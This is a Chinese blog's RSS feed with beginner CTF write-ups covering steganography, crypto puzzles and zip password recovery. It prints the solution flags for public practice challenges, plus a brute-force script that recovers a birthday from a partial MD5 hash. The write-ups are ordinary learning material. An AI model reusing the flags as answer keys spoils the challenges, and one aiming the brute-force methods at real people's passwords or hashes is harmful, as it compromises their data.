@@ -1,0 +1,2359 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>wuko's blog</title><link>https://blog.wuko.top/</link><description>Recent content on wuko's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Thu, 31 Oct 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wuko.top/index.xml" rel="self" type="application/rss+xml"/><item><title>【更新中】buuctf杂项misc解密记录</title><link>https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/</link><pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/</guid><description>&lt;img src="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/cover.png" alt="Featured image of post 【更新中】buuctf杂项misc解密记录" />&lt;h2 id="签到">签到
+&lt;/h2>&lt;p>&lt;code>flag{buu_ctf}&lt;/code>&lt;/p>
+&lt;h2 id="金三胖">金三胖
+&lt;/h2>&lt;p>给定GIF文件，可以很明显看到flag文字，对文件进行拆解，在&lt;code>20&lt;/code>、&lt;code>50&lt;/code>与&lt;code>78&lt;/code>帧找到flag：&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_20.png"
+width="219"
+height="186"
+srcset="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_20_hu5309208176571147590.png 480w, https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_20_hu9134215854692141964.png 1024w"
+loading="lazy"
+alt="20"
+class="gallery-image"
+data-flex-grow="117"
+data-flex-basis="282px"
+> &lt;img src="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_50.png"
+width="219"
+height="186"
+srcset="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_50_hu16102295754427472348.png 480w, https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_50_hu11268408520341003400.png 1024w"
+loading="lazy"
+alt="50"
+class="gallery-image"
+data-flex-grow="117"
+data-flex-basis="282px"
+> &lt;img src="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_78.png"
+width="219"
+height="186"
+srcset="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_78_hu2953572223524848583.png 480w, https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/j_78_hu244559741389829029.png 1024w"
+loading="lazy"
+alt="78"
+class="gallery-image"
+data-flex-grow="117"
+data-flex-basis="282px"
+>&lt;/p>
+&lt;h2 id="你竟然赶我走">你竟然赶我走
+&lt;/h2>&lt;p>查看文件元数据，末尾得到flag：&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/sc1.png"
+width="1088"
+height="253"
+srcset="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/sc1_hu16899393618416593707.png 480w, https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/sc1_hu2680858608685506945.png 1024w"
+loading="lazy"
+alt="sc1"
+class="gallery-image"
+data-flex-grow="430"
+data-flex-basis="1032px"
+>&lt;/p>
+&lt;p>&lt;code>flag{stego_is_s0_bor1ing}&lt;/code>&lt;/p>
+&lt;h2 id="二维码">二维码
+&lt;/h2>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/QR_code.png"
+width="280"
+height="280"
+srcset="https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/QR_code_hu4446632039196267122.png 480w, https://blog.wuko.top/posts/2024/10/31/buuctf-misc.html/QR_code_hu10624095176395150321.png 1024w"
+loading="lazy"
+alt="qrcode"
+class="gallery-image"
+data-flex-grow="100"
+data-flex-basis="240px"
+>&lt;/p>
+&lt;p>直接扫码得到flag&amp;hellip;并没有，扫码得到：&lt;code>secret is here&lt;/code>&lt;/p>
+&lt;p>十六进制分析，发现有zip文件，使用&lt;code>binwalk&lt;/code>分离，发现有一个名为&lt;code>4number.txt&lt;/code>加密文件，使用&lt;code>APCHPR&lt;/code>秒了：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Advanced Archive Password Recovery 统计信息:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">加密的 ZIP/RAR/ACE/ARJ 文件: D:\BUU\misc\二维码\_QR_code.png.extracted\1D7.zip
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">总计口令: 8,741
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">总计时间: 10ms
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">平均速度(口令/秒): 874,100
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">这个文件的口令 : 7639
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">十六进制口令: 37 36 33 39
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>得到&lt;code>CTF{vjpw_wnoei}&lt;/code>&lt;/p></description></item><item><title>About</title><link>https://blog.wuko.top/pages/about.html/</link><pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/pages/about.html/</guid><description>&lt;blockquote>
+&lt;p>欢迎访问无空的博客！&lt;/p>
+&lt;/blockquote>
+&lt;p>可以访问我的个人主页:&lt;a class="link" href="wuko.top" >wuko.top&lt;/a>&lt;/p>
+&lt;p>头像来自&lt;a class="link" href="https://x.com/nekotou" target="_blank" rel="noopener"
+>猫豆腐老师(ねことうふ)&lt;/a>的&lt;a class="link" href="https://www.pixiv.net/user/159912/series/34515" target="_blank" rel="noopener"
+>深夜雀食堂&lt;/a>中的伊吹萃香，由AI上色。&lt;/p>
+&lt;h2 id="联系我">联系我
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>Email : [admin@wuko.top] [wuko233@gmail.com]&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>GitHub: &lt;a class="link" href="https://github.com/wuko233" target="_blank" rel="noopener"
+>https://github.com/wuko233&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="更多平台">更多平台
+&lt;/h2></description></item><item><title>某高校CTF招新题MD——初试CTF</title><link>https://blog.wuko.top/posts/2024/10/30/newbiectf.html/</link><pubDate>Wed, 30 Oct 2024 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2024/10/30/newbiectf.html/</guid><description>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/cover.jpg" alt="Featured image of post 某高校CTF招新题MD——初试CTF" />&lt;h2 id="前言">前言
+&lt;/h2>&lt;p>上个月参加了某高校网络安全社团的招新题，记录一下部分题的解题过程。&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;mark>&lt;strong>很多题非原创，无法标明出处还请谅解&lt;/strong>&lt;/mark>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="misc">misc
+&lt;/h2>&lt;h3 id="misc1">misc1
+&lt;/h3>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc1.png"
+width="240"
+height="240"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc1_hu10354779845161925884.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc1_hu10479758606616733686.png 1024w"
+loading="lazy"
+alt="misc1"
+class="gallery-image"
+data-flex-grow="100"
+data-flex-basis="240px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>提示：flag在图片数据中&lt;/p>
+&lt;/blockquote>
+&lt;p>嗯，根据提示，使用&lt;code>WinHEX&lt;/code>打开图片查看16进制元数据，发现flag：&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc1_1.png"
+width="1885"
+height="361"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc1_1_hu7871839201506083490.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc1_1_hu6025428871597820838.png 1024w"
+loading="lazy"
+alt="misc1_1"
+class="gallery-image"
+data-flex-grow="522"
+data-flex-basis="1253px"
+>&lt;/p>
+&lt;p>&lt;code>geek{unbelievable}&lt;/code>&lt;/p>
+&lt;h3 id="misc2">misc2
+&lt;/h3>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc2.png"
+width="1860"
+height="1798"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc2_hu9439625977773339056.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc2_hu18167751659464539628.png 1024w"
+loading="lazy"
+alt="misc2"
+class="gallery-image"
+data-flex-grow="103"
+data-flex-basis="248px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>提示：这不只是个图片&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;code>WinHEX&lt;/code>查看16进制，发现里面有zip的头尾：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ZIP
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">50 4B 03 04
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">50 4B 05 06
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>binwalk&lt;/code>提取出压缩包，解压得到第二张图片，扫码得到flag：&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc2_2.png"
+width="1706"
+height="1279"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc2_2_hu8705883669154433653.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc2_2_hu7952245374788092403.png 1024w"
+loading="lazy"
+alt="misc2_2"
+class="gallery-image"
+data-flex-grow="133"
+data-flex-basis="320px"
+>&lt;/p>
+&lt;p>&lt;code>geek{Amazing}&lt;/code>&lt;/p>
+&lt;h3 id="misc3">misc3
+&lt;/h3>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc3_1.png"
+width="1611"
+height="937"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc3_1_hu1393974999765817317.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc3_1_hu13596937491369835350.png 1024w"
+loading="lazy"
+alt="misc3_1"
+class="gallery-image"
+data-flex-grow="171"
+data-flex-basis="412px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>提示：为啥图片不全呢？&lt;/p>
+&lt;/blockquote>
+&lt;p>根据提示，对图片进行长宽高修复，得到：&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc3-fixed.png"
+width="1706"
+height="1279"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc3-fixed_hu12562750906809051060.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc3-fixed_hu6606467951166528962.png 1024w"
+loading="lazy"
+alt="misc3-fixed"
+class="gallery-image"
+data-flex-grow="133"
+data-flex-basis="320px"
+>&lt;/p>
+&lt;p>&lt;code>geek{HAPPY}&lt;/code>&lt;/p>
+&lt;h3 id="misc4">misc4
+&lt;/h3>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc4.jpg"
+width="1080"
+height="1080"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc4_hu13591414652916174773.jpg 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc4_hu12735305196860009024.jpg 1024w"
+loading="lazy"
+alt="misc4"
+class="gallery-image"
+data-flex-grow="100"
+data-flex-basis="240px"
+>&lt;/p>
+&lt;p>16位编辑器查看，末尾发现有misc4.mp3字样，以及zip的头尾&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc4_1.png"
+width="1095"
+height="549"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc4_1_hu4084605846687595574.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/misc4_1_hu9077857965639256612.png 1024w"
+loading="lazy"
+alt="misc4_4"
+class="gallery-image"
+data-flex-grow="199"
+data-flex-basis="478px"
+>&lt;/p>
+&lt;p>使用&lt;code>foremost&lt;/code>分离，得到带密码的压缩包&amp;mdash;&lt;code>APCHPR&lt;/code>爆破出zip文件密码：2024&lt;/p>
+&lt;p>解压得到&lt;code>misc4.mp3&lt;/code>，一耳听出莫斯码，得出flag：&lt;/p>
+&lt;p>&lt;code>geek{MORSEISGOOD}&lt;/code>&lt;/p>
+&lt;h2 id="crypto">crypto
+&lt;/h2>&lt;h3 id="crypto1">crypto1
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">密文：Z2Vla3tDb21lIG9uIX0=
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">提示：Base Base ~~
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>base64&lt;/code>解密得出flag:&lt;/p>
+&lt;p>&lt;code>geek{Come on!}&lt;/code>&lt;/p>
+&lt;h3 id="crypto2">crypto2
+&lt;/h3>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/crypto2.png"
+width="1280"
+height="960"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/crypto2_hu11994337903806300105.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/crypto2_hu12851822250463243030.png 1024w"
+loading="lazy"
+alt="crypto2"
+class="gallery-image"
+data-flex-grow="133"
+data-flex-basis="320px"
+>&lt;/p>
+&lt;p>猪圈密码解密得到：&lt;/p>
+&lt;p>&lt;code>geek{welcometogeek}&lt;/code>&lt;/p>
+&lt;h3 id="crypto3">crypto3
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">题目：
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">在一个阳光明媚的早晨，小兔子跳跳正在森林里玩耍。它一边跳跃，一边享受着清新的空气和美丽的景色。忽然，它在一棵大树下发现了一个奇怪的盒子，盒子的外观很古老，上面刻着复杂的花纹。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">好奇的小兔子决定打开这个盒子。经过一番努力，盒子终于打开了，里面是一封信和一个看似重要的古老符号。信上写着：“这是一个通往秘密世界的钥匙，但你需要找到正确的密码才能进入。”
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">小兔子心里充满了探险的热情，开始寻找这个密码。它想到了朋友们，决定去问问聪明的小狐狸和勇敢的小熊。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">小狐狸听了小兔子的故事，建议道：“或许这个密码就藏在我们平时的生活中。我们可以想象一下，什么事情对我们来说是最重要的。”
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">小熊则说：“我觉得应该是我们友情的象征，或者我们一起度过的快乐时光。”
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">小兔子灵机一动，突然想到了一个词：“冒险！”它相信这个词是打开新世界的钥匙。于是，它带着小狐狸和小熊再次回到那个神秘的盒子前，大声喊出了那个词。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">然而，盒子却没有反应。小兔子感到有些失望，但它没有放弃，决定再观察一下那个古老的符号。它注意到符号中有一些像是数字和字母的组合。经过一番分析，小兔子想到了一个线索：“如果我们把这些符号想象成一种密码，那会不会是字母和数字的结合？”
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">经过一番讨论和尝试，它们最终拼出了一个神秘的字符串。小兔子觉得这个字符串有种特别的感觉，可能就是那个通往秘密世界的关键。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">小兔子再次勇敢地对着盒子大声说出这个字符串。随着最后一个字母的发出，盒子发出了一声“咔嚓”声，缓缓打开了。里面闪烁着五彩斑斓的光芒，不同的奇幻生物纷纷出现，它们带来了无数的新奇和冒险。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">小兔子、小狐狸和小熊兴奋地跳了起来，决定一起探索这个全新的世界。他们知道，只要团结在一起，任何谜题都能被解开，未来的冒险一定会更加精彩！
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">至于那条密文“U2FsdGVkX1/saBrBFn5W/3kLIuGaSpo1BS+F4PyHJSNglsQ=”，它仿佛是这个神秘世界的另一把钥匙，等待着他们去解锁更多未知的宝藏和故事。冒险才刚刚开始！
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这道题一开始以为是base混合加密，因为一开始前半部分base64解码出了Salted_完整字符，尝试了好久都没解出来。之后看官方WP，才知道原来是&lt;code>rabbit密码&lt;/code>；&lt;/p>
+&lt;p>&lt;code>geek{you are great}&lt;/code>&lt;/p>
+&lt;h3 id="crypto4">crypto4
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">小张把女儿出生日期的哈希值写在纸上，结果不小心将外卖洒在了上面，只能看到后10位是2b74d3e7a1，你能猜到他女儿的生日吗？哦!他女儿属兔哦。（提示：flag为密码的哈希值）
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>通过python程序暴力列举得到生日20231028&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">hashlib&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">itertools&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">hmac&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#https://blog.csdn.net/mails2008/article/details/140398473&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;2b74d3e7a1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">characters&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;1234567890&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dir_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">itertools&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">product&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">characters&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">repeat&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">dir_list&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hashlib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hexdigest&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">res&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">:]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;birthday;&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#output:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#birthday;(&amp;#39;2&amp;#39;, &amp;#39;0&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;3&amp;#39;, &amp;#39;1&amp;#39;, &amp;#39;0&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;8&amp;#39;)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#2473ff35a9ae66a24b8995&amp;lt;mark&amp;gt;2b74d3e7a1&amp;lt;/mark&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/crypto-output.png"
+width="1280"
+height="1517"
+srcset="https://blog.wuko.top/posts/2024/10/30/newbiectf.html/crypto-output_hu9570623928596128690.png 480w, https://blog.wuko.top/posts/2024/10/30/newbiectf.html/crypto-output_hu3099802382456035407.png 1024w"
+loading="lazy"
+alt="crypto4-output"
+class="gallery-image"
+data-flex-grow="84"
+data-flex-basis="202px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>参考了 &lt;a class="link" href="https://blog.csdn.net/mails2008/article/details/140398473" target="_blank" rel="noopener"
+>csdn&lt;/a> 做了一些修改、&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="crypto5">crypto5
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">题目：三个小姐两个爹JM2VMRKVKYZUGSJVINMFKWSDJBEEMVSWJVGUGMSHIZBUMTKRKNEEWWSMI5DU2Q2YJZFEQRSBKZCEYTCFLJDEWVSCKFEEMSKGJFGUENI=
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">提示1：大老爷有一个女儿，二老爷有两个女儿
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">提示2：老爷留了12个金条，剩下16条都给了小姐
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>提取所有数字得到key&lt;code>1221216&lt;/code>,base26-32-64-91混合解码得到&lt;code>Z2Vla3todWFuPFUW4Z3ONF6Q====&lt;/code>,base64解码得到一半是乱码&amp;hellip;得到了&lt;code>geek{huan&lt;/code>&lt;/p>
+&lt;p>后来查看官方WP，原来是两部分。。。：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Z2Vla3todWFu
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PFUW4Z3ONF6Q====
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
